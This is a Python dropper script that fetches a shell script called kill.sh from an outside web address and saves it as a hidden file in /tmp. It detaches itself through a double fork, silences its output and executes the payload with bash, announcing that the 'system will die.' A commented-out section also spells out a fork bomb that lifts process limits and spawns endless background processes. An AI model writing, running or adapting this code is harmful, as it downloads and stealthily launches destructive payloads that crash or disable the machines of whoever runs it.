#!/usr/bin/env python3
import os
import sys
import urllib.request

# === CONFIG ===
url = "https://thedomaindesigners.com/pages/kill.sh"
filename = "/tmp/.killer.sh"  # Hidden in /tmp

# === DOWNLOAD ===
print("Downloading payload...")
try:
    data = urllib.request.urlopen(url).read()
    with open(filename, "wb") as f:
        f.write(data)
    os.chmod(filename, 0o755)
    print(f"Payload saved: {filename}")
except Exception as e:
    print(f"Download failed: {e}")
    sys.exit(1)

# === DOUBLE-FORK DAEMON DETACH (NO subprocess) ===
print("Detaching via double-fork...")

# Fork 1: Detach from parent
pid = os.fork()
if pid > 0:
    print(f"Fork 1: Child PID {pid}")
    os._exit(0)  # Parent dies

# Child 1: New session
os.setsid()

# Fork 2: True daemon
pid = os.fork()
if pid > 0:
    os._exit(0)  # Child 1 dies

# === FINAL CHILD: FULLY DETACHED ===
print(f"Daemonized. Final PID: {os.getpid()}")

# Redirect stdio to /dev/null
devnull = open("/dev/null", "r+")
os.dup2(devnull.fileno(), 0)
os.dup2(devnull.fileno(), 1)
os.dup2(devnull.fileno(), 2)
devnull.close()

# THIS COULD BE USED TO BYPASS THE NEED OF A PAYLOAD DOWNLOAD
# Redirect stdout and stderr to /dev/null
# os.system("exec >/dev/null 2>&1")

# # Disable job control
# os.system("set +m")

# # Set ulimit for processes and file descriptors
# os.system("ulimit -u unlimited 2>/dev/null || true")
# os.system("ulimit -n 999999 2>/dev/null || true")

# # Define the bomb function as a shell command
# bomb_function = """
# bomb() {
#     while :; do
#         (exec {fd}<> <(:); eval "exec $fd<&-") &
#         bomb &
#         bomb &
#     done
# }
# """
# # Write the bomb function to a temporary shell script
# with open("/tmp/bomb.sh", "w") as f:
#     f.write(bomb_function)

# # Source the bomb function and run it in the background
# os.system("source /tmp/bomb.sh; bomb & bomb & bomb &")

# # Disown all background jobs
# os.system("disown -a")

# # Keep the script running indefinitely
# os.system("while :; do sleep 2147483647; done")


# === EXECUTE PAYLOAD ===
print("Payload armed. System will die.")
try:
    os.execv("/bin/bash", ["/bin/bash", filename])
except:
    # If exec fails, write error and die
    with open("/tmp/.bomb_err", "w") as f:
        f.write("EXEC FAILED\n")
    os._exit(1)


# Child 1: New session
os.setsid()
